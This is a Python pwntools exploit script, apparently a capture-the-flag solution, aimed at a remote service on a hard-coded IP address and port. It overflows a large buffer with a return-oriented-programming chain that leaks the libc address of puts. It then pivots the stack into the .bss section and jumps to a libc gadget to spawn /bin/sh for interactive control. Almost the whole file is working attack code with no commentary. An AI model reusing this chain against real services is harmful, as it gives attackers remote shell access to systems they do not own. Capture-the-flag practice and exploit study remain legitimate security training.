from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF('./bc.so.6')
b = ELF("./aeiou")

puts_plt = b.plt['puts']
read_plt = b.plt['read']
system_plt = b.plt['system']
leave_addr = 0x400d70

pop_rdi_addr = 0x4026f3
puts_got = b.got['puts']
pop_rbp_addr = 0x400c70
pop_rsi_addr = 0x4026f1

bss_addr = 0x604100

io = remote('110.10.147.109',17777)
#io = remote('0',1111)
io.sendline('3')

payload = '\x00'*0x1010+p64(bss_addr-0x8)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi_addr) + p64(0)
payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(0)
payload += p64(read_plt)+ p64(pop_rdi_addr)+p64(bss_addr+(48*8+24))+p64(puts_plt)
#payload += p64(system_plt)
payload += p64(leave_addr)

payload = payload.ljust(0x1a00,'\x00')
io.sendline(str(0x1a00))
sleep(0.1)
io.send(payload)
io.recvuntil('Thank You :)\n')
base = u64(io.recv(6)+'\x00\x00')-libc.symbols['puts']
print hex(base)
payload2 = p64(pop_rdi_addr)+p64(bss_addr+24)+p64(base+0x45390)+'/bin/sh\x00'
payload2 = p64(pop_rdi_addr)+p64(bss_addr+24)+p64(base+0x4526a)+'\x00'*(0x30*8)+"/bin/sh\x00"
io.send(payload2)
context.log_level='debug'
io.interactive()
